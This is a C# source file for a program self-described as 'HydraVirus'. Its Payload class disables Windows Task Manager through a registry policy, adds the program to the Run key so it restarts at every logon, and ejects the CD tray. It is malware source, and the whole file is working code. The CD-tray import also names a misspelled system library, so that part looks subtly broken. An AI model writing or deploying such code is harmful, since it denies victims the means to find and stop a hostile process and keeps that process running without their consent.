using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Media;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;

namespace HydraVirus
{
    class Payload
    {
        [DllImport("winm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uRetrunLenght, int hwndCallback);

        public void BlockTaskMgr()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if(key.GetValue("DisableTaskMgr") == null)
            {
                key.SetValue("DisableTaskMgr", "1");
            }
        }
        
        public void OpenDisck()
        {
            try
            {
                int result = mciSendString("set cdaudio door open", null, 0, 0);
                Thread.Sleep(3000);
                result = mciSendString("set cdaudio door close", null, 0, 0);
            }
            catch (Exception ex)
            { }
        }

        public void AutoStart()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            reg.SetValue("Hydra", Application.ExecutablePath.ToString());
        }
    }
}